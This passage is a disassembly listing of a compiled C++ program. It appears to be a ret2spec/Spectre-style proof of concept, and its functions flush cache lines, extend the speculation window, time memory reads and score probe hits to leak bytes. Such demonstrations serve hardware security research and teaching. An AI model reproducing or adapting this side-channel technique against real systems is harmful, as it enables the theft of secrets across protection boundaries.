    196f:	lea    rsi,[rip+0x16ea]        # 3060 <_IO_stdin_used+0x60>
    1976:	lea    rdi,[rip+0x37e3]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    197d:	call   1120 <_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l@plt>
    1982:	mov    BYTE PTR [rsp+0x8],r12b
    1987:	mov    rax,QWORD PTR [rip+0x37d2]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    198e:	mov    rax,QWORD PTR [rax-0x18]
    1992:	lea    rdx,[rip+0x37c7]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    1999:	cmp    QWORD PTR [rdx+rax*1+0x10],0x0
    199f:	je     19e5 <_Z16Ret2specLeakBytev+0x1f1>
    19a1:	lea    rsi,[rsp+0x8]
    19a6:	mov    edx,0x1
    19ab:	lea    rdi,[rip+0x37ae]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    19b2:	call   1120 <_ZSt16__ostream_insertIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_PKS3_l@plt>
    19b7:	mov    rbx,rax
    19ba:	mov    rax,QWORD PTR [rbx]
    19bd:	mov    rax,QWORD PTR [rax-0x18]
    19c1:	mov    rbp,QWORD PTR [rbx+rax*1+0xf0]
    19c9:	test   rbp,rbp
    19cc:	je     19fe <_Z16Ret2specLeakBytev+0x20a>
    19ce:	cmp    BYTE PTR [rbp+0x38],0x0
    19d2:	je     1a21 <_Z16Ret2specLeakBytev+0x22d>
    19d4:	movzx  eax,BYTE PTR [rbp+0x43]
    19d8:	movsx  esi,al
    19db:	mov    rdi,rbx
    19de:	call   1030 <_ZNSo3putEc@plt>
    19e3:	jmp    1a3a <_Z16Ret2specLeakBytev+0x246>
    19e5:	movsx  esi,r12b
    19e9:	lea    rdi,[rip+0x3770]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    19f0:	call   1030 <_ZNSo3putEc@plt>
    19f5:	lea    rbx,[rip+0x3764]        # 5160 <_ZSt4cerr@GLIBCXX_3.4>
    19fc:	jmp    19ba <_Z16Ret2specLeakBytev+0x1c6>
    19fe:	call   1150 <_ZSt16__throw_bad_castv@plt>
    1a03:	endbr64
    1a07:	mov    rbx,rax
    1a0a:	mov    rdi,QWORD PTR [rsp+0x10]
    1a0f:	test   rdi,rdi
    1a12:	je     1a19 <_Z16Ret2specLeakBytev+0x225>
    1a14:	call   10e0 <_ZdlPv@plt>
    1a19:	mov    rdi,rbx
    1a1c:	call   1190 <_Unwind_Resume@plt>
    1a21:	mov    rdi,rbp
    1a24:	call   1130 <_ZNKSt5ctypeIcE13_M_widen_initEv@plt>
    1a29:	mov    rax,QWORD PTR [rbp+0x0]
    1a2d:	mov    esi,0xa
    1a32:	mov    rdi,rbp
    1a35:	call   QWORD PTR [rax+0x30]
    1a38:	jmp    19d8 <_Z16Ret2specLeakBytev+0x1e4>
    1a3a:	mov    rdi,rax
    1a3d:	call   10a0 <_ZNSo5flushEv@plt>
    1a42:	mov    edi,0x1
    1a47:	call   1140 <exit@plt>
    1a4c:	call   1110 <__stack_chk_fail@plt>

0000000000001a51 <_GLOBAL__sub_I_return_true_base_case>:
    1a51:	endbr64
    1a55:	push   rbp
    1a56:	push   rbx
    1a57:	sub    rsp,0x8
    1a5b:	lea    rbp,[rip+0x3862]        # 52c4 <_ZStL8__ioinit>
    1a62:	mov    rdi,rbp
    1a65:	call   1170 <_ZNSt8ios_base4InitC1Ev@plt>
    1a6a:	lea    rbx,[rip+0x3597]        # 5008 <__dso_handle>
    1a71:	mov    rdx,rbx
    1a74:	mov    rsi,rbp
    1a77:	mov    rdi,QWORD PTR [rip+0x357a]        # 4ff8 <_ZNSt8ios_base4InitD1Ev@GLIBCXX_3.4>
    1a7e:	call   10d0 <__cxa_atexit@plt>
    1a83:	mov    QWORD PTR [rip+0x37f2],0x0        # 5280 <stack_mark_pointers>
    1a8e:	mov    QWORD PTR [rip+0x37ef],0x0        # 5288 <stack_mark_pointers+0x8>
    1a99:	mov    QWORD PTR [rip+0x37ec],0x0        # 5290 <stack_mark_pointers+0x10>
    1aa4:	mov    rdx,rbx
    1aa7:	lea    rsi,[rip+0x37d2]        # 5280 <stack_mark_pointers>
    1aae:	lea    rdi,[rip+0xd]        # 1ac2 <_ZNSt6vectorIPcSaIS0_EED1Ev>
    1ab5:	call   10d0 <__cxa_atexit@plt>
    1aba:	add    rsp,0x8
    1abe:	pop    rbx
    1abf:	pop    rbp
    1ac0:	ret
    1ac1:	nop

0000000000001ac2 <_ZNSt6vectorIPcSaIS0_EED1Ev>:
    1ac2:	endbr64
    1ac6:	mov    rdi,QWORD PTR [rdi]
    1ac9:	test   rdi,rdi
    1acc:	je     1adc <_ZNSt6vectorIPcSaIS0_EED1Ev+0x1a>
    1ace:	sub    rsp,0x8
    1ad2:	call   10e0 <_ZdlPv@plt>
    1ad7:	add    rsp,0x8
    1adb:	ret
    1adc:	ret
    1add:	nop

0000000000001ade <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_>:
    1ade:	endbr64
    1ae2:	push   r15
    1ae4:	push   r14
    1ae6:	push   r13
    1ae8:	push   r12
    1aea:	push   rbp
    1aeb:	push   rbx
    1aec:	sub    rsp,0x18
    1af0:	mov    QWORD PTR [rsp],rsi
    1af4:	mov    QWORD PTR [rsp+0x8],rdx
    1af9:	mov    rbp,QWORD PTR [rdi+0x8]
    1afd:	mov    r13,QWORD PTR [rdi]
    1b00:	mov    rax,rbp
    1b03:	sub    rax,r13
    1b06:	sar    rax,0x3
    1b0a:	movabs rdx,0xfffffffffffffff
    1b14:	cmp    rax,rdx
    1b17:	je     1b52 <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_+0x74>
    1b19:	mov    rbx,rdi
    1b1c:	cmp    rbp,r13
    1b1f:	mov    edx,0x1
    1b24:	cmovne rdx,rax
    1b28:	add    rax,rdx
    1b2b:	jb     1b82 <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_+0xa4>
    1b2d:	movabs r14,0xfffffffffffffff
    1b37:	cmp    rax,r14
    1b3a:	cmovbe r14,rax
    1b3e:	mov    r15,QWORD PTR [rsp]
    1b42:	sub    r15,r13
    1b45:	mov    r12d,0x0
    1b4b:	test   rax,rax
    1b4e:	je     1ba3 <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_+0xc5>
    1b50:	jmp    1b93 <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_+0xb5>
    1b52:	lea    rdi,[rip+0x151a]        # 3073 <_IO_stdin_used+0x73>
    1b59:	call   1080 <_ZSt20__throw_length_errorPKc@plt>
    1b5e:	mov    rdx,r15
    1b61:	mov    rsi,r13
    1b64:	mov    rdi,r12
    1b67:	call   1180 <memmove@plt>
    1b6c:	lea    r15,[r12+r15*1+0x8]
    1b71:	mov    rax,QWORD PTR [rsp]
    1b75:	sub    rbp,rax
    1b78:	test   rbp,rbp
    1b7b:	jg     1bc5 <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_+0xe7>
    1b7d:	add    r15,rbp
    1b80:	jmp    1bdc <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_+0xfe>
    1b82:	mov    r15,QWORD PTR [rsp]
    1b86:	sub    r15,r13
    1b89:	movabs r14,0xfffffffffffffff
    1b93:	lea    rdi,[r14*8+0x0]
    1b9b:	call   1100 <_Znwm@plt>
    1ba0:	mov    r12,rax
    1ba3:	mov    rax,QWORD PTR [rsp+0x8]
    1ba8:	mov    rax,QWORD PTR [rax]
    1bab:	mov    QWORD PTR [r12+r15*1],rax
    1baf:	test   r15,r15
    1bb2:	jg     1b5e <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_+0x80>
    1bb4:	lea    r15,[r12+r15*1+0x8]
    1bb9:	mov    rax,QWORD PTR [rsp]
    1bbd:	sub    rbp,rax
    1bc0:	test   rbp,rbp
    1bc3:	jle    1bd4 <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_+0xf6>
    1bc5:	mov    rdx,rbp
    1bc8:	mov    rsi,QWORD PTR [rsp]
    1bcc:	mov    rdi,r15
    1bcf:	call   10c0 <memcpy@plt>
    1bd4:	add    r15,rbp
    1bd7:	test   r13,r13
    1bda:	je     1be4 <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_+0x106>
    1bdc:	mov    rdi,r13
    1bdf:	call   10e0 <_ZdlPv@plt>
    1be4:	mov    QWORD PTR [rbx],r12
    1be7:	mov    QWORD PTR [rbx+0x8],r15
    1beb:	lea    rax,[r12+r14*8]
    1bef:	mov    QWORD PTR [rbx+0x10],rax
    1bf3:	add    rsp,0x18
    1bf7:	pop    rbx
    1bf8:	pop    rbp
    1bf9:	pop    r12
    1bfb:	pop    r13
    1bfd:	pop    r14
    1bff:	pop    r15
    1c01:	ret

0000000000001c02 <_ZNSt6vectorIPcSaIS0_EE12emplace_backIJS0_EEEvDpOT_>:
    1c02:	endbr64
    1c06:	mov    rax,QWORD PTR [rdi+0x8]
    1c0a:	cmp    rax,QWORD PTR [rdi+0x10]
    1c0e:	je     1c1c <_ZNSt6vectorIPcSaIS0_EE12emplace_backIJS0_EEEvDpOT_+0x1a>
    1c10:	mov    rdx,QWORD PTR [rsi]
    1c13:	mov    QWORD PTR [rax],rdx
    1c16:	add    QWORD PTR [rdi+0x8],0x8
    1c1b:	ret
    1c1c:	sub    rsp,0x8
    1c20:	mov    rdx,rsi
    1c23:	mov    rsi,rax
    1c26:	call   1ade <_ZNSt6vectorIPcSaIS0_EE17_M_realloc_insertIJS0_EEEvN9__gnu_cxx17__normal_iteratorIPS0_S2_EEDpOT_>
    1c2b:	add    rsp,0x8
    1c2f:	ret

0000000000001c30 <_ZNK16CacheSideChannel9GetOracleEv>:
    1c30:	endbr64
    1c34:	mov    rax,QWORD PTR [rdi]
    1c37:	add    rax,0x1000
    1c3d:	ret

0000000000001c3e <_ZNK16CacheSideChannel11FlushOracleEv>:
    1c3e:	endbr64
    1c42:	mov    rdx,QWORD PTR [rdi]
    1c45:	lea    rax,[rdx+0x1000]
    1c4c:	add    rdx,0x101000
    1c53:	clflush BYTE PTR [rax]
    1c56:	add    rax,0x1000
    1c5c:	cmp    rax,rdx
    1c5f:	jne    1c53 <_ZNK16CacheSideChannel11FlushOracleEv+0x15>
    1c61:	mfence
    1c64:	lfence
    1c67:	ret

0000000000001c68 <_ZN16CacheSideChannel15RecomputeScoresEc>:
    1c68:	endbr64
    1c6c:	push   r14
    1c6e:	push   r13
    1c70:	push   r12
    1c72:	push   rbp
    1c73:	push   rbx
    1c74:	sub    rsp,0x830
    1c7b:	mov    r12,rdi
    1c7e:	mov    r14d,esi
    1c81:	mov    r13d,esi
    1c84:	mov    rax,QWORD PTR fs:0x28
    1c8d:	mov    QWORD PTR [rsp+0x828],rax
    1c95:	xor    eax,eax
    1c97:	lea    rdi,[rsp+0x20]
    1c9c:	mov    ecx,0x100
    1ca1:	rep stos QWORD PTR es:[rdi],rax
    1ca4:	mov    ebx,0xd
    1ca9:	movzx  ebp,bl
    1cac:	lea    rdi,[rbp+0x1]
    1cb0:	shl    rdi,0xc
    1cb4:	add    rdi,QWORD PTR [r12]
    1cb8:	call   2232 <MeasureReadLatency>
    1cbd:	mov    QWORD PTR [rsp+rbp*8+0x20],rax
    1cc2:	add    rbx,0xa7
    1cc9:	cmp    rbx,0xa70d
    1cd0:	jne    1ca9 <_ZN16CacheSideChannel15RecomputeScoresEc+0x41>
    1cd2:	mov    rax,rsp
    1cd5:	mov    QWORD PTR [rsp+0x8],rax
    1cda:	mov    QWORD PTR [rsp],rax
    1cde:	mov    QWORD PTR [rsp+0x10],0x0
    1ce7:	lea    rbx,[rsp+0x20]
    1cec:	mov    rbp,rsp
    1cef:	jmp    1d1a <_ZN16CacheSideChannel15RecomputeScoresEc+0xb2>
    1cf1:	mov    rdi,rax
    1cf4:	mov    rax,QWORD PTR [rbx]
    1cf7:	mov    QWORD PTR [rdi+0x10],rax
    1cfb:	mov    rsi,rbp
    1cfe:	call   1040 <_ZNSt8__detail15_List_node_base7_M_hookEPS0_@plt>
    1d03:	add    QWORD PTR [rsp+0x10],0x1
    1d09:	add    rbx,0x8
    1d0d:	lea    rax,[rsp+0x820]
    1d15:	cmp    rbx,rax
    1d18:	je     1d3d <_ZN16CacheSideChannel15RecomputeScoresEc+0xd5>
    1d1a:	mov    edi,0x18
    1d1f:	call   1100 <_Znwm@plt>
    1d24:	jmp    1cf1 <_ZN16CacheSideChannel15RecomputeScoresEc+0x89>
    1d26:	endbr64
    1d2a:	mov    rbx,rax
    1d2d:	mov    rdi,rsp
    1d30:	call   2106 <_ZNSt7__cxx1110_List_baseImSaImEE8_M_clearEv>
    1d35:	mov    rdi,rbx
    1d38:	call   1190 <_Unwind_Resume@plt>
    1d3d:	mov    rdi,rsp
    1d40:	call   1f16 <_ZNSt7__cxx114listImSaImEE4sortEv>
    1d45:	mov    rbx,QWORD PTR [rsp]
    1d49:	mov    rax,QWORD PTR [rsp+0x10]
    1d4e:	mov    rsi,rax
    1d51:	shr    rsi,0x3c
    1d55:	jne    1d6f <_ZN16CacheSideChannel15RecomputeScoresEc+0x107>
    1d57:	test   rax,rax
    1d5a:	je     1de4 <_ZN16CacheSideChannel15RecomputeScoresEc+0x17c>
    1d60:	lea    rdi,[rax*8+0x0]
    1d68:	call   1100 <_Znwm@plt>
    1d6d:	jmp    1d92 <_ZN16CacheSideChannel15RecomputeScoresEc+0x12a>
    1d6f:	lea    rdi,[rip+0x131a]        # 3090 <_IO_stdin_used+0x90>
    1d76:	call   1080 <_ZSt20__throw_length_errorPKc@plt>
    1d7b:	endbr64
    1d7f:	mov    rbx,rax
    1d82:	mov    rdi,rsp
    1d85:	call   2106 <_ZNSt7__cxx1110_List_baseImSaImEE8_M_clearEv>
    1d8a:	mov    rdi,rbx
    1d8d:	call   1190 <_Unwind_Resume@plt>
    1d92:	mov    r9,rax
    1d95:	mov    rax,rsp
    1d98:	cmp    rbx,rax
    1d9b:	je     1db6 <_ZN16CacheSideChannel15RecomputeScoresEc+0x14e>
    1d9d:	mov    rax,r9
    1da0:	mov    rcx,rsp
    1da3:	mov    rdx,QWORD PTR [rbx+0x10]
    1da7:	mov    QWORD PTR [rax],rdx
    1daa:	add    rax,0x8
    1dae:	mov    rbx,QWORD PTR [rbx]
    1db1:	cmp    rbx,rcx
    1db4:	jne    1da3 <_ZN16CacheSideChannel15RecomputeScoresEc+0x13b>
    1db6:	mov    rcx,QWORD PTR [r9+0x400]
    1dbd:	movzx  r14d,r14b
    1dc1:	mov    rax,rcx
    1dc4:	sub    rax,QWORD PTR [rsp+r14*8+0x20]
    1dc9:	shr    rax,1
    1dcc:	sub    rcx,rax
    1dcf:	mov    eax,0x0
    1dd4:	mov    edx,0x0
    1dd9:	lea    rsi,[rsp+0x20]
    1dde:	movsx  r8,r13b
    1de2:	jmp    1df8 <_ZN16CacheSideChannel15RecomputeScoresEc+0x190>
    1de4:	mov    r9d,0x0
    1dea:	jmp    1d95 <_ZN16CacheSideChannel15RecomputeScoresEc+0x12d>
    1dec:	add    rax,0x1
    1df0:	cmp    rax,0x100
    1df6:	je     1e0d <_ZN16CacheSideChannel15RecomputeScoresEc+0x1a5>
    1df8:	cmp    QWORD PTR [rsi+rax*8],rcx
    1dfc:	jae    1dec <_ZN16CacheSideChannel15RecomputeScoresEc+0x184>
    1dfe:	cmp    r8,rax
    1e01:	setne  dil
    1e05:	movzx  edi,dil
    1e09:	add    edx,edi
    1e0b:	jmp    1dec <_ZN16CacheSideChannel15RecomputeScoresEc+0x184>
    1e0d:	cmp    edx,0x1
    1e10:	je     1e1c <_ZN16CacheSideChannel15RecomputeScoresEc+0x1b4>
    1e12:	mov    rsi,rax
    1e15:	mov    edx,0x0
    1e1a:	jmp    1e5f <_ZN16CacheSideChannel15RecomputeScoresEc+0x1f7>
    1e1c:	mov    edx,0x0
    1e21:	lea    rsi,[rsp+0x20]
    1e26:	movsx  r13,r13b
    1e2a:	jmp    1e3f <_ZN16CacheSideChannel15RecomputeScoresEc+0x1d7>
    1e2c:	add    DWORD PTR [r12+rdx*4+0x8],0x1
    1e32:	add    rdx,0x1
    1e36:	cmp    rdx,0x100
    1e3d:	je     1e12 <_ZN16CacheSideChannel15RecomputeScoresEc+0x1aa>
    1e3f:	cmp    QWORD PTR [rsi+rdx*8],rcx
    1e43:	jae    1e32 <_ZN16CacheSideChannel15RecomputeScoresEc+0x1ca>
    1e45:	cmp    r13,rdx
    1e48:	jne    1e2c <_ZN16CacheSideChannel15RecomputeScoresEc+0x1c4>
    1e4a:	jmp    1e32 <_ZN16CacheSideChannel15RecomputeScoresEc+0x1ca>
    1e4c:	mov    rsi,rax
    1e4f:	mov    rax,rdx
    1e52:	add    rdx,0x1
    1e56:	cmp    rdx,0x101
    1e5d:	je     1e76 <_ZN16CacheSideChannel15RecomputeScoresEc+0x20e>
    1e5f:	mov    ecx,DWORD PTR [r12+rdx*4+0x8]
    1e64:	cmp    ecx,DWORD PTR [r12+rax*4+0x8]
    1e69:	jg     1e4c <_ZN16CacheSideChannel15RecomputeScoresEc+0x1e4>
    1e6b:	cmp    ecx,DWORD PTR [r12+rsi*4+0x8]
    1e70:	cmovg  rsi,rdx
    1e74:	jmp    1e52 <_ZN16CacheSideChannel15RecomputeScoresEc+0x1ea>
    1e76:	mov    edx,DWORD PTR [r12+rsi*4+0x8]
    1e7b:	lea    edx,[rdx+rdx*1+0x28]
    1e7f:	cmp    DWORD PTR [r12+rax*4+0x8],edx
    1e84:	mov    ebx,0x0
    1e89:	setg   bl
    1e8c:	mov    bh,al
    1e8e:	mov    rdi,r9
    1e91:	call   10e0 <_ZdlPv@plt>
    1e96:	mov    rdi,rsp
    1e99:	call   2106 <_ZNSt7__cxx1110_List_baseImSaImEE8_M_clearEv>
    1e9e:	mov    rax,QWORD PTR [rsp+0x828]
    1ea6:	sub    rax,QWORD PTR fs:0x28
    1eaf:	jne    1ec3 <_ZN16CacheSideChannel15RecomputeScoresEc+0x25b>
    1eb1:	mov    eax,ebx
    1eb3:	add    rsp,0x830
    1eba:	pop    rbx
    1ebb:	pop    rbp
    1ebc:	pop    r12
    1ebe:	pop    r13
    1ec0:	pop    r14
    1ec2:	ret
    1ec3:	call   1110 <__stack_chk_fail@plt>

0000000000001ec8 <_ZN16CacheSideChannel24AddHitAndRecomputeScoresEv>:
    1ec8:	endbr64
    1ecc:	sub    rsp,0x8
    1ed0:	mov    rax,QWORD PTR [rip+0x33f1]        # 52c8 <_ZZN16CacheSideChannel24AddHitAndRecomputeScoresEvE25additional_offset_counter>
    1ed7:	imul   rsi,rax,0xa7
    1ede:	add    rsi,0xd
    1ee2:	mov    rcx,QWORD PTR [rdi]
    1ee5:	movzx  edx,sil
    1ee9:	shl    rdx,0xc
    1eed:	lea    rdx,[rcx+rdx*1+0x1000]
    1ef5:	movzx  edx,BYTE PTR [rdx]
    1ef8:	add    rax,0x1
    1efc:	and    eax,0xff
    1f01:	mov    QWORD PTR [rip+0x33c0],rax        # 52c8 <_ZZN16CacheSideChannel24AddHitAndRecomputeScoresEvE25additional_offset_counter>
    1f08:	movsx  esi,sil
    1f0c:	call   1c68 <_ZN16CacheSideChannel15RecomputeScoresEc>
    1f11:	add    rsp,0x8
    1f15:	ret

0000000000001f16 <_ZNSt7__cxx114listImSaImEE4sortEv>:
    1f16:	endbr64
    1f1a:	push   r15
    1f1c:	push   r14
    1f1e:	push   r13
    1f20:	push   r12
    1f22:	push   rbp
    1f23:	push   rbx
    1f24:	sub    rsp,0x438
    1f2b:	mov    rax,QWORD PTR fs:0x28
    1f34:	mov    QWORD PTR [rsp+0x428],rax
    1f3c:	xor    eax,eax
    1f3e:	mov    rax,QWORD PTR [rdi]
    1f41:	cmp    rax,rdi
    1f44:	je     20b6 <_ZNSt7__cxx114listImSaImEE4sortEv+0x1a0>
    1f4a:	mov    r15,rdi
    1f4d:	cmp    rdi,QWORD PTR [rax]
    1f50:	je     20b6 <_ZNSt7__cxx114listImSaImEE4sortEv+0x1a0>
    1f56:	lea    rax,[rsp+0x10]
    1f5b:	mov    QWORD PTR [rsp+0x18],rax
    1f60:	mov    QWORD PTR [rsp+0x10],rax
    1f65:	lea    rax,[rsp+0x20]
    1f6a:	mov    QWORD PTR [rsp+0x8],rax
    1f6f:	lea    rdx,[rsp+0x420]
    1f77:	mov    QWORD PTR [rax+0x8],rax
    1f7b:	mov    QWORD PTR [rax],rax
    1f7e:	add    rax,0x10
    1f82:	cmp    rdx,rax
    1f85:	jne    1f77 <_ZNSt7__cxx114listImSaImEE4sortEv+0x61>
    1f87:	lea    r14,[rsp+0x20]
    1f8c:	lea    r12,[rsp+0x10]
    1f91:	jmp    2016 <_ZNSt7__cxx114listImSaImEE4sortEv+0x100>
    1f96:	mov    rbx,QWORD PTR [rbx]
    1f99:	cmp    rbx,rbp
    1f9c:	je     1fc0 <_ZNSt7__cxx114listImSaImEE4sortEv+0xaa>
    1f9e:	cmp    rsi,r12
    1fa1:	je     1fc0 <_ZNSt7__cxx114listImSaImEE4sortEv+0xaa>
    1fa3:	mov    rax,QWORD PTR [rbx+0x10]
    1fa7:	cmp    QWORD PTR [rsi+0x10],rax
    1fab:	jae    1f96 <_ZNSt7__cxx114listImSaImEE4sortEv+0x80>
    1fad:	mov    r13,QWORD PTR [rsi]
    1fb0:	mov    rdx,r13
    1fb3:	mov    rdi,rbx
    1fb6:	call   1070 <_ZNSt8__detail15_List_node_base11_M_transferEPS0_S1_@plt>
    1fbb:	mov    rsi,r13
    1fbe:	jmp    1f99 <_ZNSt7__cxx114listImSaImEE4sortEv+0x83>
    1fc0:	cmp    rsi,r12
    1fc3:	je     1fd0 <_ZNSt7__cxx114listImSaImEE4sortEv+0xba>
    1fc5:	mov    rdx,r12
    1fc8:	mov    rdi,rbp
    1fcb:	call   1070 <_ZNSt8__detail15_List_node_base11_M_transferEPS0_S1_@plt>
    1fd0:	mov    rsi,rbp
    1fd3:	mov    rdi,r12
    1fd6:	call   11a0 <_ZNSt8__detail15_List_node_base4swapERS0_S1_@plt>
    1fdb:	add    rbp,0x10
    1fdf:	cmp    r14,rbp
    1fe2:	je     20ec <_ZNSt7__cxx114listImSaImEE4sortEv+0x1d6>
    1fe8:	mov    rbx,QWORD PTR [rbp+0x0]
    1fec:	cmp    rbx,rbp
    1fef:	je     1ffd <_ZNSt7__cxx114listImSaImEE4sortEv+0xe7>
    1ff1:	mov    rsi,QWORD PTR [rsp+0x10]
    1ff6:	cmp    rsi,r12
    1ff9:	jne    1fa3 <_ZNSt7__cxx114listImSaImEE4sortEv+0x8d>
    1ffb:	jmp    1fd0 <_ZNSt7__cxx114listImSaImEE4sortEv+0xba>
    1ffd:	mov    rsi,rbp
    2000:	mov    rdi,r12
    2003:	call   11a0 <_ZNSt8__detail15_List_node_base4swapERS0_S1_@plt>
    2008:	cmp    r14,rbp
    200b:	je     20f7 <_ZNSt7__cxx114listImSaImEE4sortEv+0x1e1>
    2011:	cmp    r15,QWORD PTR [r15]
    2014:	je     2037 <_ZNSt7__cxx114listImSaImEE4sortEv+0x121>
    2016:	mov    rsi,QWORD PTR [r15]
    2019:	mov    rdx,QWORD PTR [rsi]
    201c:	mov    rdi,r12
    201f:	call   1070 <_ZNSt8__detail15_List_node_base11_M_transferEPS0_S1_@plt>
    2024:	lea    rax,[rsp+0x20]
    2029:	cmp    r14,rax
    202c:	je     20db <_ZNSt7__cxx114listImSaImEE4sortEv+0x1c5>
    2032:	mov    rbp,rax
    2035:	jmp    1fe8 <_ZNSt7__cxx114listImSaImEE4sortEv+0xd2>
    2037:	lea    rax,[rsp+0x30]
    203c:	cmp    r14,rax
    203f:	je     20aa <_ZNSt7__cxx114listImSaImEE4sortEv+0x194>
    2041:	mov    rbp,rax
    2044:	jmp    208f <_ZNSt7__cxx114listImSaImEE4sortEv+0x179>
    2046:	mov    rbx,QWORD PTR [rbx]
    2049:	cmp    rbx,rbp
    204c:	je     2070 <_ZNSt7__cxx114listImSaImEE4sortEv+0x15a>
    204e:	cmp    r12,rsi
    2051:	je     2070 <_ZNSt7__cxx114listImSaImEE4sortEv+0x15a>
    2053:	mov    rax,QWORD PTR [rbx+0x10]
    2057:	cmp    QWORD PTR [rsi+0x10],rax
    205b:	jae    2046 <_ZNSt7__cxx114listImSaImEE4sortEv+0x130>
    205d:	mov    r13,QWORD PTR [rsi]
    2060:	mov    rdx,r13
    2063:	mov    rdi,rbx
    2066:	call   1070 <_ZNSt8__detail15_List_node_base11_M_transferEPS0_S1_@plt>
    206b:	mov    rsi,r13
    206e:	jmp    2049 <_ZNSt7__cxx114listImSaImEE4sortEv+0x133>
    2070:	cmp    r12,rsi
    2073:	je     2080 <_ZNSt7__cxx114listImSaImEE4sortEv+0x16a>
    2075:	mov    rdx,r12
    2078:	mov    rdi,rbp
    207b:	call   1070 <_ZNSt8__detail15_List_node_base11_M_transferEPS0_S1_@plt>
    2080:	add    rbp,0x10
    2084:	add    QWORD PTR [rsp+0x8],0x10
    208a:	cmp    r14,rbp
    208d:	je     20aa <_ZNSt7__cxx114listImSaImEE4sortEv+0x194>
    208f:	mov    rax,QWORD PTR [rsp+0x8]
    2094:	mov    r12,rax
    2097:	mov    rbx,QWORD PTR [rbp+0x0]
    209b:	mov    rsi,QWORD PTR [rax]
    209e:	cmp    rbx,rbp
    20a1:	je     2070 <_ZNSt7__cxx114listImSaImEE4sortEv+0x15a>
    20a3:	cmp    rsi,rax
    20a6:	jne    2053 <_ZNSt7__cxx114listImSaImEE4sortEv+0x13d>
    20a8:	jmp    2070 <_ZNSt7__cxx114listImSaImEE4sortEv+0x15a>
    20aa:	lea    rdi,[r14-0x10]
    20ae:	mov    rsi,r15
    20b1:	call   11a0 <_ZNSt8__detail15_List_node_base4swapERS0_S1_@plt>
    20b6:	mov    rax,QWORD PTR [rsp+0x428]
    20be:	sub    rax,QWORD PTR fs:0x28
    20c7:	jne    2100 <_ZNSt7__cxx114listImSaImEE4sortEv+0x1ea>
    20c9:	add    rsp,0x438
    20d0:	pop    rbx
    20d1:	pop    rbp
    20d2:	pop    r12
    20d4:	pop    r13
    20d6:	pop    r14
    20d8:	pop    r15
    20da:	ret
    20db:	lea    rsi,[rsp+0x20]
    20e0:	lea    rdi,[rsp+0x10]
    20e5:	call   11a0 <_ZNSt8__detail15_List_node_base4swapERS0_S1_@plt>
    20ea:	jmp    20f7 <_ZNSt7__cxx114listImSaImEE4sortEv+0x1e1>
    20ec:	mov    rsi,rbp
    20ef:	mov    rdi,r12
    20f2:	call   11a0 <_ZNSt8__detail15_List_node_base4swapERS0_S1_@plt>
    20f7:	add    r14,0x10
    20fb:	jmp    2011 <_ZNSt7__cxx114listImSaImEE4sortEv+0xfb>
    2100:	call   1110 <__stack_chk_fail@plt>
    2105:	nop

0000000000002106 <_ZNSt7__cxx1110_List_baseImSaImEE8_M_clearEv>:
    2106:	endbr64
    210a:	push   rbp
    210b:	push   rbx
    210c:	sub    rsp,0x8
    2110:	mov    rbp,rdi
    2113:	mov    rbx,QWORD PTR [rdi]
    2116:	cmp    rbx,rdi
    2119:	je     212b <_ZNSt7__cxx1110_List_baseImSaImEE8_M_clearEv+0x25>
    211b:	mov    rdi,rbx
    211e:	mov    rbx,QWORD PTR [rbx]
    2121:	call   10e0 <_ZdlPv@plt>
    2126:	cmp    rbx,rbp
    2129:	jne    211b <_ZNSt7__cxx1110_List_baseImSaImEE8_M_clearEv+0x15>
    212b:	add    rsp,0x8
    212f:	pop    rbx
    2130:	pop    rbp
    2131:	ret

0000000000002132 <_Z18FlushFromDataCachePKvS0_>:
    2132:	endbr64
    2136:	cmp    rdi,rsi
    2139:	jae    214b <_Z18FlushFromDataCachePKvS0_+0x19>
    213b:	clflush BYTE PTR [rdi]
    213e:	add    rdi,0x40
    2142:	and    rdi,0xffffffffffffffc0
    2146:	cmp    rdi,rsi
    2149:	jb     213b <_Z18FlushFromDataCachePKvS0_+0x9>
    214b:	mfence
    214e:	lfence
    2151:	ret

0000000000002152 <_Z23ExtendSpeculationWindowv>:
    2152:	endbr64
    2156:	lea    rsi,[rip+0x4184]        # 62e1 <_ZZ23ExtendSpeculationWindowvE6buffer+0x1001>
    215d:	lea    rdi,[rsi-0x1]
    2161:	call   2132 <_Z18FlushFromDataCachePKvS0_>
    2166:	movzx  eax,BYTE PTR [rip+0x4173]        # 62e0 <_ZZ23ExtendSpeculationWindowvE6buffer+0x1000>
    216d:	ret

000000000000216e <_Z17PinToTheFirstCorev>:
    216e:	endbr64
    2172:	push   rbx
    2173:	sub    rsp,0x90
    217a:	mov    rax,QWORD PTR fs:0x28
    2183:	mov    QWORD PTR [rsp+0x88],rax
    218b:	xor    eax,eax
    218d:	mov    rbx,rsp
    2190:	lea    rdx,[rsp+0x8]
